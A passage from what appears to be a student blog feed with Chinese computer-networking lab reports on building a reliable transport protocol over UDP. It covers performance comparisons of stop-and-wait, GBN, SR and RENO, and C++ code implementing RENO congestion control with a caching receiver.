single_pkt_timer2=<span class="hljs-built_in">clock</span>();    cout&lt;&lt;<span class="hljs-string">"ack_between_time: "</span>&lt;&lt;single_pkt_timer2-single_pkt_timer1&lt;&lt;endl;    single_pkt_timer1=<span class="hljs-built_in">clock</span>();    ...handle pkts...    }</code></pre></div></div><p>另外，在丢包率为10%，窗口大小为10时，路由器总是会丢弃同一个包，因此会造成无法正常接收的情况。因此采用9%来指代丢包率极高的情形。</p><h3 id="滑动窗口参数探索">滑动窗口参数探索</h3><h5 id="窗口大小比较">窗口大小比较</h5><p>根据上面的探索，在探索滑动窗口参数时，控制延迟和丢包率分别为0ms和1%，以尽可能减少等待时间的前提下验证其正常功能发挥，同时避免路由器程序bug的影响。</p><p>GBN在不同窗口大小情况下的数据如下所示：</p><table><thead><tr class="header"><th>窗口大小</th><th>2</th><th>5</th><th>10</th><th>20</th><th>30</th></tr></thead><tbody><tr class="odd"><td>传输速率（ms）</td><td>36192</td><td>37274</td><td>37429</td><td>38220</td><td>47513</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205753403446_900_20221230235947937654_537_image-20221230214521654.png" alt="image-20221230214521654" width="50%" height="50%"></p><p>可以看到，当窗口大小较大时，制约传输速度的因素主要是接收端接收的速度，因此单纯的增大窗口大小并无益于增加传输速度，如下所示为窗口大小为40时的情况：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205754351405_153_20221230235948815831_502_image-20221230214007362.png" alt="image-20221230214007362"><figcaption aria-hidden="true">image-20221230214007362</figcaption></figure><p>当然也注意到，即便窗口大小设为2，性能也不如停等版本。</p><h5 id="不同算法的比较">不同算法的比较</h5><p>而对于SR来说，这种现象则出现的更为严重，由于接收端需要对更多的情况进行判断和处理，且以至于在实验条件下疲于应付发送端发送的速度，因此出现了明明没有丢的包，由于接收方没有及时处理并且返回ACK，导致发送端循环进行超时重传，传输无法正常进行。如下图所示：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205755332234_875_20221230235950876688_746_image-20221230220200564.png" alt="image-20221230220200564" width="80%" height="80%"></p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205756610390_290_20221230235952186704_885_image-20221230220316189.png" alt="image-20221230220316189" width="90%" height="90%"></p><p>出现了这种情况后，尽管窗口仍旧可以移动，但由于接收方不得不处理大量重复的分组，导致恶性循环：越重发越接收的慢，越接收的慢越重发。不久就会出现重发的包远大于事实上需要的包的局面：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205757732612_214_20221230235953488408_156_image-20221230221445403.png" alt="image-20221230221445403" width="80%" height="80%"></p><p>解决方法可以是增大判断超时的时间。但是很明显，这会增加传输时间，而且这也并没有解决根本问题，并且会使正常情形下丢包的代价增加。</p><p>因此我们看到，由于发送和接收速率相差太大，“流量控制”也没能控制住。只好强行压制发送端的速度，查看在接收和发送基本对等的情况下滑动窗口的表现：</p><p>具体做法是在发送每一个while循环手动添加延时，模拟上层交付流较缓慢的情况：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5zo74jlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-5zo74jlluwpkzv"><pre><code class="hljs c++"><span class="hljs-comment">// wait for a while to send next packet (simulating content processing)</span><span class="hljs-comment">// this is to avoid sending too many packets at once</span><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">10</span>);</code></pre></div></div><p>这时SR算法顺畅的进行了接收：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205759168631_535_20221230235954811850_358_image-20221230222352630.png" alt="image-20221230222352630" width="67%" height="67%"></p><p>在添加发送延时后，控制变量（延迟和丢包率分别为0ms和1%）并测量吞吐率：</p><table><thead><tr class="header"><th>窗口大小</th><th>2</th><th>10</th><th>40</th></tr></thead><tbody><tr class="odd"><td>停等</td><td>65120</td><td>65120</td><td>65120</td></tr><tr class="even"><td>GBN</td><td>46008</td><td>46335</td><td>49433</td></tr><tr class="odd"><td>SR</td><td>39249</td><td>40451</td><td>48574</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205800197076_765_20221230235956046493_674_image-20221230231420543.png" alt="image-20221230231420543" width="80%" height="80%"></p><p>可以看到，此时滑动窗口发挥了其应有的作用。</p><h3 id="拥塞控制性能探索">拥塞控制性能探索</h3><p>在实验3.3中提到，在GBN上实现RENO算法可以不改变发送端（累积确认，不缓存），但这样带来的问题是这种情况下快速重传当前期望的包只是解决了“眼前的问题”，其余的包迟早还要超时重传，因此尽管进⾏了拥塞控制，但重传的⾏为在实际⽹络环境中事实上加剧了拥塞。因此对接收端进行了改进，使其在保持累积确认的基础上对包进行缓存。（详细可参见<a href="https://lunaticsky-tql.github.io/posts/55889/">lab3.3</a>）</p><p>下面以窗口大小为10，延迟和丢包率分别为0ms和1%为例，对各算法性能进行对比：</p><table><thead><tr class="header"><th>停等</th><th>GBN</th><th>SR</th><th>RENO-no-cache</th><th>RENO-cached</th></tr></thead><tbody><tr class="odd"><td>65120</td><td>46335</td><td>40451</td><td>50843</td><td>25224</td></tr></tbody></table><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205801106054_539_20221230235956891555_921_image-20221230233213265.png" alt="image-20221230233213265"><figcaption aria-hidden="true">image-20221230233213265</figcaption></figure><p>可以看到缓存的RENO-cached算法性能最好，因为其在实验环境下完全避免了重传，使接收端的负担最小。如下图所示：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205802237991_691_20221230235958223014_915_image-20221230233838694.png" alt="image-20221230233838694" width="50%" height="50%"></p><p>（在真实环境下大部分情况一次丢一个包的前提下也能取得很好的表现，如果一次丢多个包，可以考虑NewRENO，如果希望更细致的预测网络环境，Cubic等算法还可以做的更好）</p><h2 id="总结">总结</h2><p>这学期的计算机网络作业层层相扣，并且有效的将理论与实践相结合。通过这几次实验，我不再停留在机械的记忆TCP各个过程的细节，而是贯通性的理解了一个可靠数据传输协议设计的过程，以及如何去应对一些特殊情况或进行优化。当然，像TCP这样复杂的协议设计远非我们简单通过几个实验能够完全理解透彻的，就比如拥塞控制算法就有很多优化的方向，在本系列实验中也没能深入探究。</p><p>这次实验采用git进行管理，虽然说还不甚规范，但也让我更加熟悉了git的工作流，为以后进行更大项目的开发做准备。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205803263913_266_20221231000000050866_774_image-20221230234222414.png" alt="image-20221230234222414" width="50%" height="50%"></p><h3 id="源代码">源代码</h3><p><a href="https://github.com/Lunaticsky-tql/rdt_on_udp">github</a></p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验3.3-基于UDP服务设计可靠传输协议(拥塞控制)</title>
    <link href="/posts/55889/"/>
    <url>/posts/55889/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验3.3-基于udp服务设计可靠传输协议拥塞控制">计算机网络实验3.3-基于UDP服务设计可靠传输协议(拥塞控制)</h1><h2 id="实验要求">实验要求</h2><ul><li>在实验3-2的基础上，选择实现一种拥塞控制算法，也可以是改进的算法，完成给定测试文件的传输。</li><li>RENO算法；</li><li>也可以自行设计协议或实现其他拥塞控制算法；</li><li>给出实现的拥塞控制算法的原理说明；</li><li>有必要日志输出（须显示窗口大小改变情况）。</li></ul><h2 id="程序流程展示">程序流程展示</h2><p>注：与实验3.1相同的部分仅作简要叙述，详细可以参见<a href="https://lunaticsky-tql.github.io/posts/24837/">计算机网络实验实验3.1</a></p><h3 id="协议设计">协议设计</h3><p>基于rdt3.0,本次实验在GBN的基础上实现了RENO拥塞控制算法，并通过令接收方缓存失序包验证了快速重传的正确性和有效性。</p><h4 id="报文结构">报文结构</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210349911222_209_20221230152034348306_831_image-20221210213415264.png" alt="image-20221210213415264"><figcaption aria-hidden="true">image-20221210213415264</figcaption></figure><p>如图所示，报文头长度共<code>128Bits</code>。下面介绍报文结构如下所示：</p><p>整个实验只使用一个序列号字段。对于发送端对应<code>TCP</code>中的<code>seq</code>,接收端对应<code>TCP</code>中的<code>ack</code>。</p><p>下面是十六位校验和以及数据报字段长度，与<code>TCP</code>相同。</p><p>使用<code>u_short</code>来存放<code>flag</code>。其字段含义如下：</p><p><code>F</code>:<code>FIN</code></p><p><code>S</code>:<code>SYN</code></p><p><code>A</code>:<code>ACK</code></p><p><code>H</code>:<code>FILE_HEAD</code></p><p><code>FILE_HEAD</code>用于指示接收端此报文包含文件信息的字段。</p><p><code>window_size</code>存放接收端通告给发送端的窗口大小。</p><p><code>option</code>为可选字段，在本次实验中暂时用于存放文件长度。</p><p><code>data</code>的最大长度可以调节，本次实验定义为1024字节。</p><p>此部分代码段的定义可参阅源代码或<code>3.1</code>部分的报告。</p><h4 id="建连和断连">建连和断连</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210351561005_344_20221230152036062959_629_image-20221119154308774.png" alt="image-20221119154308774"><figcaption aria-hidden="true">image-20221119154308774</figcaption></figure><p>建连和断连过程与3.1无太大变化。主要是在建连过程中增加了接收方初始窗口大小的通告。</p><h2 id="程序代码解释">程序代码解释</h2><h3 id="文件发送过程">文件发送过程</h3><h4 id="发送端">发送端</h4><p>在本次实验中发送端实现的是基础的RENO算法.状态机如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210353307221_304_20221230152038775603_907_image-20221230093102447.png" alt="image-20221230093102447"><figcaption aria-hidden="true">image-20221230093102447</figcaption></figure><p>下面将结合代码进行拥塞控制算法具体的原理及实现。</p><h5 id="发送分组">发送分组</h5><p>首先由于拥塞控制算法中窗口大小计算是以字节为单位的，因此本次实验中计算和展示窗口大小时也改为字节计数（而不是按分组计数），如下图所示：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210355265155_315_20221230152040038538_334_image-20221230094338108.png" alt="image-20221230094338108" width="80%" height="80%"></p><p>在发送时，只需要添加“实际发送窗口取决于接收通告窗口和拥塞控制窗口中较小值”对应的代码即可，对应于第一行：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-as2arglluwpkzv"></i><span>C++</span><div class="collapse show" id="collapse-as2arglluwpkzv"><pre><code class="hljs C++"><span class="hljs-comment">//send packets</span>window_size = <span class="hljs-built_in">min</span>(cwnd, advertised_window_size);<span class="hljs-keyword">if</span> ((LastByteSent - LastByteAcked &lt; window_size) &amp;&amp; (LastByteSent &lt; file_len)) {    pkt_data_size = <span class="hljs-built_in">min</span>(MAX_SIZE, file_len - nextseqnum * MAX_SIZE);    sndpkts[nextseqnum] = <span class="hljs-built_in">make_pkt</span>(DATA, nextseqnum, pkt_data_size, file_data + nextseqnum * MAX_SIZE);    <span class="hljs-built_in">udt_send</span>(sndpkts[nextseqnum]);    cout &lt;&lt; <span class="hljs-string">"Sent packet "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum) + <span class="hljs-string">" "</span>;    <span class="hljs-keyword">if</span> (base == nextseqnum) {        timer.<span class="hljs-built_in">start_timer</span>();    }    nextseqnum++;    LastByteSent += pkt_data_size;    <span class="hljs-built_in">print_window</span>();}</code></pre></div></div><p>拥塞控制相关的逻辑主要在于接收ACK和超时时的窗口变化。下面将着重讲解。</p><h5 id="接收ack">接收ACK</h5><p>首先我们先来看处理正常收到ACK的情况：</p><p>上一个实验中提到，实际网络环境中<code>ACK</code>未必是按序到达的，因此将<code>base</code>的移动改为判断按照按序接收到ACK为标准进行滑动，如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jsvmzhlluwpkzv"></i><span>C++</span><div class="collapse show" id="collapse-jsvmzhlluwpkzv"><pre><code class="hljs C++"><span class="hljs-comment">//        base = get_ack_num(rcvpkt) + 1;</span>        acked[<span class="hljs-built_in">get_ack_num</span>(rcvpkt)] = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">while</span> (acked[base]) {            base++;        }</code></pre></div></div><p>但是，实际上注意到，当接收方发出一个更大的ACK，说明之前的ACK事实上已经按序收到。当发送方收到一个更大的ACK时，不管之前的ACK有没有返回到发送方，发送方仅通过这个信息就已经可以确信接收方按序收到了之前的ACK了。因此其实是可以放心的进行<code>base = get_ack_num(rcvpkt) + 1</code>的。</p><p>之后，我们据此更新<code>LastByteAcked</code>，然后根据状态机对RENO算法的状态进行更新，最后更新窗口大小。据此，代码如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wro8lelluwpkzv"></i><span>C++</span><div class="collapse show" id="collapse-wro8lelluwpkzv"><pre><code class="hljs C++">      u_int ack_num = <span class="hljs-built_in">get_ack_num</span>(rcvpkt);<span class="hljs-keyword">if</span> (ack_num &gt;= base) {          u_int gap = ack_num - base + <span class="hljs-number">1</span>;          <span class="hljs-comment">//update the base and LastByteAcked</span>          <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; gap; i++) {              LastByteAcked += sndpkts[base + i].head.data_size;          }          base = ack_num + <span class="hljs-number">1</span>;          <span class="hljs-keyword">switch</span> (RENO_STATE) {              <span class="hljs-keyword">case</span> SLOW_START:                  cwnd += gap * MSS;                  dupACKcount = <span class="hljs-number">0</span>;                  <span class="hljs-keyword">if</span> (cwnd &gt;= ssthresh) {                      RENO_STATE = CONGESTION_AVOIDANCE;                  }                  <span class="hljs-keyword">break</span>;              <span class="hljs-keyword">case</span> CONGESTION_AVOIDANCE:                  cwnd += gap * MSS * MSS / cwnd;                  dupACKcount = <span class="hljs-number">0</span>;                  <span class="hljs-keyword">break</span>;              <span class="hljs-keyword">case</span> FAST_RECOVERY:                  cwnd = ssthresh;                  RENO_STATE = CONGESTION_AVOIDANCE;                  dupACKcount = <span class="hljs-number">0</span>;                  <span class="hljs-keyword">break</span>;              <span class="hljs-keyword">default</span>:                  <span class="hljs-keyword">break</span>;          }          window_size = <span class="hljs-built_in">min</span>(cwnd, advertised_window_size);      }</code></pre></div></div><p>处于慢启动阶段时，窗口大小增大1MSS。每过一个RTT，cwnd翻倍，窗口大小呈指数增长；而处于拥塞避阶段时，免<code>cwnd = cwnd + MSS*(MSS/cwnd)</code>。相当于每过一个RTT，cwnd加1。</p><p>当收到冗余ACK时，我们需要进行快速重传，并进行窗口大小更新。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ti9m34lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-ti9m34lluwpkzv"><pre><code class="hljs c++"><span class="hljs-comment">//duplicate ACK</span>dupACKcount++;<span class="hljs-keyword">if</span> (RENO_STATE == SLOW_START || RENO_STATE == CONGESTION_AVOIDANCE) {    <span class="hljs-keyword">if</span> (dupACKcount == <span class="hljs-number">3</span>) {        <span class="hljs-comment">//fast retransmit</span>        ssthresh = cwnd / <span class="hljs-number">2</span>;        cwnd = ssthresh + <span class="hljs-number">3</span> * MSS;        window_size = <span class="hljs-built_in">min</span>(cwnd, advertised_window_size);        RENO_STATE = FAST_RECOVERY;        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Fast resend"</span>+<span class="hljs-built_in">to_string</span>(ack_num), WARNING);        <span class="hljs-comment">//resend the packet</span>        <span class="hljs-built_in">udt_send</span>(sndpkts[ack_num + <span class="hljs-number">1</span>]);    } <span class="hljs-keyword">else</span> {        cwnd += MSS;    }}</code></pre></div></div><h5 id="超时处理">超时处理</h5><p>注意到，不管什么状态下，超时后都需要恢复到慢启动状态，因此直接在超时事件上进行改动即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ujh7pqlluwpkzv"></i><span>C++</span><div class="collapse show" id="collapse-ujh7pqlluwpkzv"><pre><code class="hljs C++"><span class="hljs-comment">//handle timeout</span><span class="hljs-keyword">if</span> (timer.<span class="hljs-built_in">timeout</span>()) {    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Timeout, resend packets from "</span> + <span class="hljs-built_in">to_string</span>(base) + <span class="hljs-string">" to "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum - <span class="hljs-number">1</span>),                  WARNING);    <span class="hljs-keyword">for</span> (u_int i = base; i &lt; nextseqnum; i++) {        <span class="hljs-built_in">udt_send</span>(sndpkts[i]);    }    ssthresh = cwnd / <span class="hljs-number">2</span>;    cwnd = MSS;    dupACKcount = <span class="hljs-number">0</span>;    RENO_STATE = SLOW_START;    timer.<span class="hljs-built_in">start_timer</span>();}</code></pre></div></div><h4 id="接收端">接收端</h4><p>首先我们可以运行查看接收端不进行改变的情况：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210357363668_598_20221230152041186332_251_image-20221230114950444.png" alt="image-20221230114950444"><figcaption aria-hidden="true">image-20221230114950444</figcaption></figure><p>可以看到，当接收方不缓存失序的包时，即使有了快速重传，由于之前发过的，对接收端来说失序的包没有进行缓存，仍旧相当于丢失了。因此快速重传当前期望的包只是解决了“眼前的问题”，其余的包迟早还要超时重传，因此尽管进行了拥塞控制，但重传的行为在实际网络环境中事实上加剧了拥塞。</p><p>因此基于此可以对接收端的逻辑进行改进：</p><p>在前面提到，接收端必须是累计确认的（确认按序收到的最大序号），发送端才有理由在移动窗口时移动到当前<code>ack+1</code>的位置。同时我们还想让接收端缓存失序的包，以避免发送端进行已收到的包的重传而加剧拥塞。</p><p>因此我在上一次实验的<code>SR</code>的基础上修改发送ACK行为，使其从选择确认转变成累计确认，同时保留其缓存失序包行为即可解决这个问题。代码如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ugjoezlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-ugjoezlluwpkzv"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (pkt_seq &gt;= rcv_base &amp;&amp; pkt_seq &lt;= rcv_base + N - <span class="hljs-number">1</span>) {     <span class="hljs-comment">//in the window</span>     <span class="hljs-keyword">if</span> (!acked[pkt_seq]) {         <span class="hljs-keyword">if</span> (pkt_seq == rcv_base) {             <span class="hljs-comment">//the first packet in the window</span>             pkt_data_size = rcvpkt.head.data_size;             <span class="hljs-built_in">memcpy</span>(file_buffer + pkt_seq * MAX_SIZE, rcvpkt.data, pkt_data_size);             acked[pkt_seq] = <span class="hljs-literal">true</span>;             <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq), DEBUG);             <span class="hljs-comment">//slide the window</span>             <span class="hljs-keyword">while</span> (acked[rcv_base]) {                 rcv_base++;             }             packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, rcv_base - <span class="hljs-number">1</span>);             <span class="hljs-built_in">udt_send</span>(sndpkt);         } <span class="hljs-keyword">else</span> {             <span class="hljs-comment">//not the first packet in the window, cache it</span>             pkt_data_size = rcvpkt.head.data_size;             <span class="hljs-built_in">memcpy</span>(file_buffer + pkt_seq * MAX_SIZE, rcvpkt.data, pkt_data_size);             acked[pkt_seq] = <span class="hljs-literal">true</span>;             packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, rcv_base - <span class="hljs-number">1</span>);             <span class="hljs-built_in">udt_send</span>(sndpkt);             <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">", cached"</span>, DEBUG);         }     } <span class="hljs-keyword">else</span> {         <span class="hljs-comment">//already acked in the window, do not resend ack</span>         <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">" again"</span>, WARNING);           packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, rcv_base - <span class="hljs-number">1</span>);           <span class="hljs-built_in">udt_send</span>(sndpkt);     } }</code></pre></div></div><p>当收到窗口内的包时，总是发送当前<code>rcv_base - 1</code>位置的ACK。但是如果收到的包恰巧在<code>rcv_base</code>上，那么窗口其实有潜力往前移动很多，以覆盖之前缓存过的包。移动完了之后再发送<code>rcv_base - 1</code>位置的ACK，让发送端知道在这之前的包都已经按序收到了。除此之外的情况都不发送ACK。</p><p>可以看到，修改后快速恢复起到了其应有的作用。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210358596080_182_20221230152042406823_264_image-20221230150921352.png" alt="image-20221230150921352"><figcaption aria-hidden="true">image-20221230150921352</figcaption></figure><p>成功收取！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210359833669_236_20221230152044466619_169_image-20221230151133854.png" alt="image-20221230151133854"><figcaption aria-hidden="true">image-20221230151133854</figcaption></figure><h2 id="程序演示">程序演示</h2><h3 id="建立连接">建立连接</h3><p>路由器设置：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210401042416_182_20221230152045800174_408_image-20221119185527966.png" alt="image-20221119185527966"><figcaption aria-hidden="true">image-20221119185527966</figcaption></figure><p>增大通告窗口大小，观察慢启动和拥塞控制阶段窗口大小变化。慢启动阶段，<code>cwnd</code>的值迅速增大，当<code>cwnd&gt;=ssthresh</code>后进入拥塞控制阶段，cwnd增速减缓。</p><figure><img 